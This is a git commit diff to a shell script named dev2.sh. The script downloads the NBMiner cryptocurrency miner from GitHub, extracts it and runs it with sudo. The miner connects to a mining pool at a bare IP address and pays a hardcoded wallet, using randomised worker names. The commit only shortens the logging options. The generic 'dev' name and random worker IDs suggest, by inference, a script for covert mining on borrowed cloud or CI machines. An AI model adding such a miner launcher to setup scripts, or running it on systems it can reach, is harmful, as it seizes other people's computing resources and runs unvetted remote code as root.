24af7e6db260c9ae17cbfaa75a0dde1fa0384c42
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-06-14 14:02:45 +0700

    Update dev2.sh

--- dev2.sh
+++ dev2.sh
@@ -12,4 +12,4 @@ sudo apt-get install libcurl3 -y
 wget https://github.com/NebuTech/NBMiner/releases/download/v42.2/NBMiner_42.2_Linux.tgz
 sudo tar -xvf NBMiner_42.2_Linux.tgz
 cd NBMiner_Linux
-sudo ./nbminer -a ethash -o stratum+tcp://149.248.19.20:443 -u 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.$(echo $(shuf -i 1000-9999 -n 1)-KVN) --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
+sudo ./nbminer -a ethash -o stratum+tcp://149.248.19.20:443 -u 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.$(echo $(shuf -i 1000-9999 -n 1)-KVN) -log
